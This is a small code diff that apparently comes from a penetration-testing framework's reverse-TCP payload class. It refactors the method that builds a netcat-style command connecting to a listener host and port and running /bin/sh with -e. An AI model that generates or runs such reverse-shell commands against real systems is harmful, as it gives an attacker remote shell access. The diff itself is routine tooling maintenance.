@@ -15,7 +15,4 @@ class Payload(ReverseTCPPayloadMixin, GenericPayload):
     shell_binary = OptString("/bin/sh", "Shell")
 
     def generate(self):
-        return "{} {} {} -e {}".format(self.cmd,
-                                       self.lhost,
-                                       self.lport,
-                                       self.shell_binary)
+        return f"{self.cmd} {self.lhost} {self.lport} -e {self.shell_binary}"
